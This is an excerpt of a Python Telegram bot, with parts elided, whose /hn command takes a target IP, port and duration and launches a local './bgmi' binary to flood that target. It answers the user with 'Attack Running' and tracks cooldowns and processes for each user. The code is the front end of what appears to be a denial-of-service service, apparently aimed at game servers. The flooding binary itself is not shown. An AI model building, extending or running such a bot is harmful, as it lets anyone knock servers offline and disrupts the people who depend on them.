...
async def hn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if len(context.args) != 3:
        await update.message.reply_text('Usage: /hn <target_ip> <port> <duration>')
        return
    ...
    command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]  # Replace with your actual command

    process = subprocess.Popen(command)
    
    # Store process info if needed
    user_processes[user_id] = {"process": process, "command": command, "target_ip": target_ip, "port": port}

    hn_cooldowns[user_id] = datetime.datetime.now() + hn_cooldown_time  # Set cooldown
    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} with {DEFAULT_THREADS} threads.\nAttack Running.')
...
if __name__ == '__main__':
    ...
    app.add_handler(CommandHandler("hnon", hnon))
    app.add_handler(CommandHandler("hnoff", hnoff))
